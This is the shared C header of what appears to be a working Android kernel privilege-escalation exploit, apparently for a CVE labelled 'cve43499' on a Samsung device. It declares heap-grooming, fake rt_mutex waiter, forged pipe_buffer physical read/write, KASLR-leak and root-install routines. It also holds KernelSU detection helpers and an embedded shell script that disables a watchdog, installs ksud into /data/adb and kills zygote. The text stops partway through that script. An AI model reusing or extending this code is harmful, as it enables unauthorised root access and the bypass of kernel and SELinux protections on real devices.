#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/file.h>
#include <sys/sysinfo.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"
#include "affinity.h"

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#endif
#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#endif
#else
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#endif
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA (-0xe80LL)
#endif

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x500
#endif
#ifndef MM_ORDER
#define MM_ORDER 3
#endif
#ifndef KERNELSNITCH_VERBOSE
#define KERNELSNITCH_VERBOSE 0
#endif
#ifndef KERNELSNITCH_MTE_ENABLED
#define KERNELSNITCH_MTE_ENABLED 0
#endif
#define MM_PARTIALS 5
/* Choreography cores are COMPILE-TIME LITERALS on purpose. Device-verified
 * on F946B: any topology probing / runtime core resolution in the payload
 * path (sysfs reads, trial sched_setaffinity migrations before the timing
 * window) destabilizes the pi-futex stage even when the final placement is
 * identical. The futex-collision channel is calibrated to the LITTLE pair
 * (0,1); the Cortex-X3 prime rejects affinity outright on this firmware
 * (restricted-core EINVAL), so there is nothing faster to legally target.
 * Background actors use src/affinity.h pin_perf_mask() AFTER root. */
#define CORE 0
#ifndef KSNITCH_COLLISIONS
#define KSNITCH_COLLISIONS 4
#endif

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define PIPE_CANDIDATE_PAGES 8
#ifndef SKB_SEND_SIZE
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#endif
#ifndef SKB_RECLAIM_SENDS
#define SKB_RECLAIM_SENDS 4
#endif
#ifndef APP_SLIDE_RECLAIM_SENDS
#define APP_SLIDE_RECLAIM_SENDS 16
#endif
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#ifndef FAKE_WAITER_PRIO
#define FAKE_WAITER_PRIO 130
#endif
#ifndef SLIDE_FAKE_WAITER_PRIO
#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
#endif
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL

#define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
#define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
#define KMALLOC_NORMAL_TYPE 0
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE 2
#endif
#define KMALLOC_PIPE_INDEX 11
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES 4
#endif
#define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#define KMALLOC_PIPE_OBJ_SIZE 0x800

#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)

#define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
#define PIPE_SCAN_CHUNK 0x400
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
#define PIPE_DRAIN_SLABS 15
#define PIPE_RECLAIM_SLABS 15
#define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
#define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
#ifndef PIPE_MAX_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PIPE_MAX_ATTEMPTS 1
#else
#define PIPE_MAX_ATTEMPTS 12
#endif
#endif

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#ifndef PSELECT_ENTER_DELAY_USEC
#define PSELECT_ENTER_DELAY_USEC 50000
#endif
#ifndef SLIDE_WAITER_WAKE_STATE
#define SLIDE_WAITER_WAKE_STATE 3
#endif
#ifndef SLIDE_LOCK_OWNER_VALUE
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#endif
#ifndef LEGACY_RT_MUTEX_WAITER
#define LEGACY_RT_MUTEX_WAITER 0
#endif
#ifndef COMPACT_RT_MUTEX_WAITER
#define COMPACT_RT_MUTEX_WAITER 0
#endif
#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
#error "select only one rt_mutex_waiter layout"
#endif
#ifndef FAKE_WAITER_LAYOUT_SIZE
#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
#endif
#define PSELECT_TIMEOUT_SEC 1
#ifndef ROUTE_WAIT_SECONDS
#define ROUTE_WAIT_SECONDS 8
#endif
#define SLIDE_NFULNL_LOGGER_NAME \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
#define SLIDE_NFULNL_LOGGER_OBJECT \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
#ifndef SLIDE_WAITER_TREE_LEFT
#define SLIDE_WAITER_TREE_LEFT SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
#endif
#define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
#ifndef SLIDE_WAITER_TASK
#define SLIDE_WAITER_TASK SLIDE_INIT_TASK
#endif
#define SLIDE_ROOT_TASK_GROUP \
  P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct user_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

extern pid_t pipe_prepare_child;
extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern uintptr_t binwrite_target;

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;
#endif
extern atomic_int cfi_stage_done;
extern atomic_int pipe_prepare_request;
extern atomic_int pipe_prepare_done;
extern ssize_t cfi_write_ret;
extern ssize_t cfi_read_ret;
extern ssize_t cfi_read_slot_ret;
extern ssize_t cfi_owner_ret;
extern ssize_t cfi_restore_ret;
extern uint64_t fops_before;
extern uint64_t fops_after;
extern int root_child_done;
extern char ashmem_path[256];
extern uint32_t root_uid_before;
extern uint32_t root_uid_after;
extern int cfi_attempts;
extern int pipe_stage_attempts;
extern int cfi_dirty_seen;
extern int cfi_last_step;
extern int cfi_last_errno;
extern uint64_t kmalloc_pipe_cache;
extern uint64_t kmalloc_normal_1k_cache;
extern uint64_t kmalloc_normal_2k_cache;
extern uint64_t kmalloc_cgroup_1k_cache;
extern uint64_t kmalloc_cgroup_2k_cache;
extern uint64_t candidate_slab_cache;
extern int pipe_cache_gate_ok;
extern int pipe_cache_page_index;
extern int pipe_cache_slot_hit;
extern uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
extern uintptr_t pipebuf_page_base;
extern uintptr_t pipebuf_addr;
extern int pipebuf_pipe_idx;
extern char physrw_readback[64];
extern char physrw_after_write[64];
extern int physrw_read_ok;
extern int physrw_write_ok;
extern int pipe_scan_vmemmap;
extern int pipe_scan_ops;
extern int pipe_scan_len;
extern int pipe_probe_found;
extern uint64_t pipe_probe_page;
extern uint64_t pipe_probe_ops;
extern uint64_t pipe_probe_private;
extern uint32_t pipe_probe_len;
extern uint32_t pipe_probe_flags;
extern uint64_t pipe_scan_first_page;
extern uint64_t pipe_scan_first_ops;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
extern int p0_virtual_base_probe;
#endif
extern uint64_t pipe_scan_q0;
extern uint64_t pipe_scan_q1;
extern uint64_t pipe_scan_q2;
extern uint64_t pipe_scan_q3;
extern uint32_t pipe_scan_first_len;
extern uint32_t pipe_scan_first_flags;
extern uint64_t physrw_read64_before;
extern uint64_t physrw_read64_after;
extern uint64_t physrw_write64_value;
extern int physrw_read64_ok;
extern int physrw_write64_ok;
extern int kaslr_done;
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern uint64_t slide_bootid_before;
extern uint64_t slide_bootid_after;
extern uint64_t slide_bootid_want;
extern ssize_t slide_bootid_restore_ret;
extern uintptr_t slide_p0_offset;
extern uintptr_t slide_oracle_parent;
extern uintptr_t slide_oracle_target;
extern uintptr_t p0_gate_page_struct;
extern uintptr_t p0_probe_page_struct;
extern uintptr_t fops_data_probe_addr;
extern int fops_data_probe_active;
extern int data_alias_uses_slide;
extern int data_addr_canonical;
extern int slide_p0_session_fresh;
extern int memfd_leak;

int run_exploit(int argc, char **argv);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
int try_cache_ashmem_path(const char *path);
int same_rdev_path(const char *path, dev_t rdev);
void init_ashmem_path(void);
int open_ashmem_device(void);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t p0_alias_image_offset(uintptr_t data_alias);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t data_direct_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t slide_canon_addr(uintptr_t data_alias);
uintptr_t canon_addr(uintptr_t image_addr);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
void put_fake_fops_table(unsigned char *p, size_t off);
int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len);
int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos);
int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
int reclaim_receiver_fd(void);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
    !defined(SLIDE_STACK_WRITER)
void fdset_put_word(fd_set *set, int word, uint64_t value);
#endif
#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);
#endif

int slide_leak_kernel_base(void);
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
int slide_sigreturn_preflight(void);
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD
void app_publish_p0_offset(uintptr_t offset);
void app_publish_slide_ready(void);
void app_publish_p0_dirty(void);
void app_publish_writer_started(void);
int select_slide_payload_slot(uintptr_t offset);
int select_slide_payload_index(size_t index);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
int app_trigger_fops_slide_route(void);
#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot);
#endif
#endif
#endif

ssize_t configfs_write_once(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
int is_direct_ptr(uintptr_t value);
uint64_t kernel_read64(int fd, uintptr_t target);
ssize_t kernel_write_data(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
int repair_fake_fops_llseek(int fd);
int restore_slide_boot_id(int fd);
int install_child_root(int fd);
int try_cfi_stage(void);



void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                     uintptr_t tree_parent, uintptr_t tree_right,
                     uintptr_t tree_left, uintptr_t pi_parent,
                     uintptr_t pi_right, uintptr_t pi_left,
                     uintptr_t task, uintptr_t lock,
                     uint32_t priority);


void init_ctx(struct mm_ctx *ctx, size_t cnt);
void resize_pipe_slots(int pipefd[2], size_t slots);
void make_pipe_object(int pipefd[2]);
void alloc_pipe_object(int pipefd[2]);
void free_pipe_object(int pipefd[2]);
uintptr_t prepare_pipe_buffer_page_child(void);
uintptr_t prepare_pipe_buffer_page(void);
void reset_pipe_attempt(void);
uintptr_t direct_to_page(uintptr_t addr);
uintptr_t direct_to_head_page(int fd, uintptr_t addr);
uintptr_t page_to_direct(uintptr_t page);
uintptr_t pipe_buf_ops_addr(void);
int pipe_cache_matches(uint64_t slab_cache);
int pipe_reclaim_cache_gate(int fd);
int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
int find_pipe_buffer(int fd, uintptr_t base);
int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len);
int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len);
#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
#endif
int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len);
int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
int install_pipe_physrw(int fd);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
int prepare_p0_pipe_oracle(void);
int expand_p0_pipe_oracle(void);
int verify_p0_pipe_oracle_gate(void);
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
uintptr_t scan_p0_pipe_oracle(void);
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void);
#endif
int restore_p0_oracle_pages(int fd);
int run_p0_pipe_oracle_diagnostic(int fd);
#endif

int install_android_root(int fd);

/*
 * Pre-exploit KernelSU liveness probe.
 *
 * KernelSU hooks sys_reboot with the 0xDEADBEEF/0xCAFEBABE magic pair and
 * hands back an fd to its control device. Without the module loaded the
 * kernel rejects the unknown reboot magic with EINVAL and never reboots, so
 * the probe is safe on stock kernels. Returns 1 when the module is already
 * responding, 0 otherwise.
 */
struct ksu_get_info_cmd {
  uint32_t version;
  uint32_t flags;
  uint32_t features;
  uint32_t uapi_version;
};

static inline int ksu_already_active(void) {
  int fd = -1;
  syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd);
  if (fd < 0) {
    return 0;
  }
  struct ksu_get_info_cmd info;
  memset(&info, 0, sizeof(info));
  int ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
  close(fd);
  return ret == 0 && info.version != 0;
}

/*
 * Universal KernelSU liveness probe: /proc/modules is world-readable and
 * readable from every SELinux context (shell, app, and the kernel-context
 * daemon alike), unlike the reboot-syscall probe above which needs
 * CAP_SYS_BOOT, and unlike boot_id markers which the daemon context could
 * not persist reliably. This is the primary detector everywhere.
 */
static inline int ksu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[4096];
  size_t carry = 0;
  int found = 0;
  ssize_t n;
  while (!found && (n = read(fd, buf + carry, sizeof(buf) - carry)) > 0) {
    size_t len = carry + (size_t)n;
    for (size_t i = 0; i + sizeof("kernelsu") - 1 <= len; i++) {
      if (buf[i] == 'k' && memcmp(buf + i, "kernelsu", 8) == 0 &&
          (i + 8 == len || buf[i + 8] == ' ' || buf[i + 8] == '\n')) {
        found = 1;
        break;
      }
    }
    if (!found) {
      carry = len < 8 ? len : 7;
      memmove(buf, buf + len - carry, carry);
    }
  }
  close(fd);
  return found;
}

/*
 * Boot-scoped activation marker. After a successful activation the root
 * daemon writes the current boot_id here. The pre-exploit check compares it
 * against the live boot_id (world-readable) to detect that KernelSU was
 * already activated this boot. This is the reliable unprivileged detector:
 * the reboot-syscall probe above requires CAP_SYS_BOOT and returns EPERM
 * from the shell/app domain even when the module is loaded, so it cannot be
 * trusted on its own before privilege escalation.
 */
#define KSU_ACTIVE_MARKER_PATH "/data/local/tmp/.cve43499-ksu-active"

static inline int read_boot_id(char *out, size_t out_len) {
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t got = read(fd, out, out_len - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  out[got] = '\0';
  while (got > 0 && (out[got - 1] == '\n' || out[got - 1] == '\r')) {
    out[--got] = '\0';
  }
  return got > 0;
}

/*
 * Boot-scoped KernelSU-active marker on public external storage. The
 * shell-context stability keeper writes it as soon as /proc/modules shows
 * the module; every later payload invocation reads it back and compares the
 * embedded boot_id. This exists because /proc/modules itself can be
 * unreadable from the untrusted_app domain on some policies, which used to
 * let an app-domain auto-root retry re-run the exploit after a zygote
 * restart even though root was already live.
 */
static inline int ksu_sd_marker_valid(void) {
  char boot_id[64];
  if (!read_boot_id(boot_id, sizeof(boot_id))) {
    return 0;
  }
  char path[160];
  snprintf(path, sizeof(path), "/storage/emulated/0/.cve43499-ksu-%s",
           boot_id);
  return access(path, R_OK) == 0;
}

static inline void ksu_sd_marker_write(void) {
  char boot_id[64];
  if (!read_boot_id(boot_id, sizeof(boot_id))) {
    return;
  }
  char path[160];
  snprintf(path, sizeof(path), "/storage/emulated/0/.cve43499-ksu-%s",
           boot_id);
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd < 0) {
    return;
  }
  ssize_t ignored = write(fd, boot_id, strlen(boot_id));
  (void)ignored;
  close(fd);
}

/* Sysfs mirror of a loaded "kernelsu" module: /sys/module/kernelsu exists
 * whenever the module is registered with the kernel and the directory is
 * traversable from contexts where /proc/modules readback is denied. */
static inline int ksu_sysfs_present(void) {
  struct stat st;
  return stat("/sys/module/kernelsu", &st) == 0 && S_ISDIR(st.st_mode);
}

static inline int ksu_active_this_boot(void) {
  /* /proc/modules reflects the live kernel state and is readable from
   * most domains, so it supersedes the old boot_id marker comparison
   * (the marker could not be persisted from the daemon context). The two
   * extra signals below keep the detector honest from restricted app
   * domains: sysfs mirrors module registration, and the public-storage
   * marker is written by the shell-context keeper right after late-load. */
  if (ksu_module_loaded()) {
    return 1;
  }
  if (ksu_sysfs_present()) {
    return 1;
  }
  return ksu_sd_marker_valid();
}

static inline void ksu_mark_active_this_boot(void) {
  char live_boot_id[64];
  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
    return;
  }
  int fd = open(KSU_ACTIVE_MARKER_PATH,
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd < 0) {
    return;
  }
  ssize_t ignored = write(fd, live_boot_id, strlen(live_boot_id));
  (void)ignored;
  close(fd);
}

/*
 * Activation handoff: the exploit side (runner or preload supervisor) drops
 * this marker once the kernel write window is closed. The root daemon, which
 * was spawned by UMH while SELinux is still permissive, polls for it and
 * performs KernelSU late-load + module activation from its own context.
 * This avoids depending on the daemon socket, which becomes unreachable for
 * shell-domain clients once SELinux re-enforces.
 */
#define KSU_ACTIVATE_SIGNAL_PATH "/data/local/tmp/.cve43499-activate"

static inline void ksu_signal_activation(void) {
  unlink(KSU_ACTIVATE_SIGNAL_PATH);
  int fd = open(KSU_ACTIVATE_SIGNAL_PATH, O_WRONLY | O_CREAT | O_EXCL, 0644);
  if (fd >= 0) {
    close(fd);
  }
}

/*
 * Module-activation completion marker: content is
 * "<boot_id> <write-time uptime>", so done-state is provably scoped to the
 * current boot while staying immune to wall-clock corrections. Both fields
 * come from world-readable procfs/sysinfo, valid from every context.
 */
#define KSU_MODULES_DONE_PATH "/data/local/tmp/.cve43499-modules-done"

static inline long ksu_uptime_sec(void) {
  struct sysinfo si;
  if (sysinfo(&si) != 0) {
    return -1;
  }
  return (long)si.uptime;
}

static inline int modules_done_this_boot(void) {
  struct stat st;
  if (stat(KSU_MODULES_DONE_PATH, &st) != 0) {
    return 0;
  }
  long up = ksu_uptime_sec();
  if (up < 0) {
    return 1;
  }
  /* Preferred format: "<boot_id> <write-time uptime>". The boot_id proves
   * the marker belongs to the current boot (an uptime-only stamp looked
   * done again on any later boot once live uptime passed the stored
   * value); the uptime component is monotonic within that boot, immune to
   * the NTP wall-clock jumps that made the pure-mtime check falsely stale
   * and re-triggered zygote kills. */
  char live_boot_id[64];
  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
    return 1;
  }
  int fd = open(KSU_MODULES_DONE_PATH, O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    char buf[128];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
      buf[n] = '\0';
      char *space = strchr(buf, ' ');
      if (space != NULL) {
        *space = '\0';
        long stored = strtol(space + 1, NULL, 10);
        if (stored > 0 && strcmp(buf, live_boot_id) == 0) {
          return stored <= up + 2;
        }
      }
    }
  }
  /* Legacy payloads ("done" text or bare uptime): fall back to the
   * mtime-vs-boot-window heuristic rather than trusting them blindly. */
  return st.st_mtime >= time(NULL) - up - 5;
}

static inline void mark_modules_done(void) {
  char payload[128];
  char live_boot_id[64];
  size_t len;
  long up = ksu_uptime_sec();
  if (up >= 0 && read_boot_id(live_boot_id, sizeof(live_boot_id))) {
    len = (size_t)snprintf(payload, sizeof(payload), "%s %ld", live_boot_id,
                           up);
  } else {
    memcpy(payload, "done", 5);
    len = 4;
  }

  int fd = open(KSU_MODULES_DONE_PATH,
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd >= 0) {
    ssize_t ignored = write(fd, payload, len);
    (void)ignored;
    close(fd);
  }
}

/*
 * Exclusive cross-process lock serializing late-load and module
 * activation across daemon, watcher and keeper actors. The fd returned
 * by the acquire is inherited by forked children so a lock held across a
 * fork stays held until every child exits; never re-acquire in a child.
 */
#define KSU_LATE_LOAD_LOCK_PATH "/data/local/tmp/.cve43499-lateload.lock"

static inline int activation_lock_acquire(void) {
  /* The daemon creates this file as root:root 0644; a shell-context actor
   * cannot reopen it O_RDWR (EACCES forever). flock(LOCK_EX) is valid on a
   * read-only descriptor, so degrade to O_RDONLY instead of failing. */
  int fd = open(KSU_LATE_LOAD_LOCK_PATH, O_RDWR | O_CREAT | O_CLOEXEC, 0644);
  if (fd < 0 && errno == EACCES) {
    fd = open(KSU_LATE_LOAD_LOCK_PATH, O_RDONLY | O_CLOEXEC);
  }
  if (fd < 0) {
    return -1;
  }
  for (;;) {
    if (flock(fd, LOCK_EX) == 0) {
      return fd;
    }
    if (errno != EINTR) {
      close(fd);
      return -1;
    }
  }
}

static inline void activation_lock_release(int fd) {
  if (fd >= 0) {
    flock(fd, LOCK_UN);
    close(fd);
  }
}

/*
 * KernelSU module lifecycle driver. Must run from a shell/app context via
 * /system/bin/su so sucompat transitions into u:r:ksu:s0 — the root
 * daemon itself lives in u:r:kernel:s0, which SELinux denies /data/adb
 * access, ksud execution and zygote signaling. Exits non-zero unless all
 * three lifecycle stages succeeded.
 *
 * Boot-safety contract: this script is retried by long-lived actors, so it
 * must never disturb a running framework unless module activation actually
 * succeeded. Exit 42 defers while the system is still booting; stage
 * failures leave the zygote untouched so retries cannot soft-reboot-loop.
 */
#define KSU_APPLY_SCRIPT \
  "softdog disable 2>/dev/null; " \
  "setprop persist.vendor.softdog off 2>/dev/null; " \
  "if [ \"$(getprop sys.boot_completed 2>/dev/null)\" != \"1\" ]; then " \
  "echo 'apply-modules: boot not completed; deferring' >&2; exit 42; fi; " \
   "ksud=''; " \
   "for p in /data/local/tmp/ksud-*-kdp /data/local/tmp/ksud-s25u-kdp " \
   "/data/adb/ksud /data/adb/ksu/bin/ksud; do " \
  "[ -x \"$p\" ] && ksud=\"$p\" && break; " \
  "done; " \
  "if [ -z \"$ksud\" ]; then " \
  "echo 'apply-modules: no ksud binary found' >&2; exit 1; " \
  "fi; " \
  "if [ \"$ksud\" != \"/data/adb/ksud\" ]; then " \
  "cp \"$ksud\" /data/adb/ksud 2>/dev/null && chmod 755 /data/adb/ksud; fi; " \
  "rc=0; " \
  "for s in post-fs-data services boot-completed; do " \
  "\"$ksud\" \"$s\" >/dev/null 2>&1 || rc=1; " \
  "echo \"apply-modules: ksud $s exit=$? ($ksud)\"; " \
  "done; " \
  "if [ \"$rc\" != \"0\" ]; then " \
  "echo 'apply-modules: ksud stages failed; leaving zygote alone' >&2; " \
  "exit $rc; fi; " \
  "if [ -d /data/adb/modules/zygisk_vector ] && " \
  "[ -x /data/adb/modules/zygisk_vector/daemon ] && " \
  "[ -z \"$(pidof vectord)\" ]; then " \
  "\"$ksud\" services >/dev/null 2>&1; sleep 2; fi; " \
  "VD=$(pidof vectord); " \
  "if [ -n \"$VD\" ]; then " \
  "echo \"apply-modules: vectord pid=$VD\"; else " \
  "echo 'apply-modules: no vectord (vector not installed or not running); " \
  "non-blocking'; fi; " \
  "killed=0; " \
  "for p in $(pidof zygote64) $(pidof zygote); do " \
  "kill -9 $p 2>/dev/null && killed=1; " \
  "done; " \
  "if [ \"$killed\" = 0 ]; then echo 'apply-modules: no zygote killed' >&2; " \
  "exit 1; fi; " \
  "PKG=\"${RMG_MANAGER_PACKAGE:-}\"; " \
  "if [ -n \"$PKG\" ]; then " \
  "cmd deviceidle whitelist +\"$PKG\" >/dev/null 2>&1; " \
